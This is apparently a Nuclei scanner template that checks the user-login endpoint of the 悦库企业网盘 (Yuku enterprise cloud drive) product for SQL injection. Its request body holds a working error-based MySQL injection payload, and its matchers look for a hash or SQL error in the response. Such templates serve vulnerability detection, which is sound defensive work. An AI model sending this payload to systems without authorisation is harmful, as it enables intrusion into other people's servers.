id: poc-yaml-ydisk-user-login-html-sqli
info:
  name: 悦库企业网盘 user-login-html SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  description: |
    This template detects an SQL injection vulnerability in the user-login endpoint of 悦库企业网盘.

variables:
  t1: "{{rand_int(1000, 10000)}}"
  t2: "{{md5(t1)}}"

http:
  - method: POST
    path:
      - "{{BaseURL}}/user/login/.html"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: "account=') AND GTID_SUBSET(CONCAT(0x7e,(SELECT (ELT(5597=5597,md5({{t1}})))),0x7e),5597)-- HZLK"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "{{t2}}"
          - "SQLSTATE"
          - "error:"
        part: body
